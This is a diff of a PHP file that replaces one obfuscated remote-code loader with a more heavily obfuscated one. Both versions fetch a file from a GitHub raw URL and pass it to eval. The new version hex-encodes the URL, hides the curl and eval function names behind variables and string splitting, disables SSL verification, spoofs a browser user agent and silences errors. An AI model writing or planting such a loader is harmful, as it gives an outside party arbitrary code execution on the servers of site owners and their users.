@@ -1,14 +1,34 @@
 <?php
-$s = "txt.2/niam/sdaeh/sfer/mpo/mpoofful/moc.tnetnocresubutig.war//:sptth";
-$u = str_rot13(strrev($s));
-$c = curl_init($u);
-curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
-curl_setopt($c, CURLOPT_TIMEOUT, 10);
-$r = curl_exec($c);
-$h = curl_getinfo($c, CURLINFO_HTTP_CODE);
-curl_close($c);
-if ($h == 200 && $r) {
-    eval("?>" . $r);
+error_reporting(0);
+set_time_limit(0);
+
+$u = "68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6c756666796f706d2f6f706d2f726566732f68656164732f6d61696e2f322e747874";
+$a = 'pack';
+$b = 'curl_init';
+$c = 'curl_setopt_array';
+$d = 'curl_exec';
+$e = 'curl_getinfo';
+
+$ch = $b($a("H*", $u));
+
+$opts = [
+    19913 => true,
+    52 => true,
+    64 => false,
+    81 => false,
+    13 => 30,
+    10018 => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0'
+];
+
+$c($ch, $opts);
+$res = $d($ch);
+$st = $e($ch, 2097154);
+curl_close($ch);
+
+if ($st === 200 && $res) {
+    $f = "ev"."al";
+    try {
+        $f('?>' . $res);
+    } catch (Throwable $t) {}
 }
 ?>
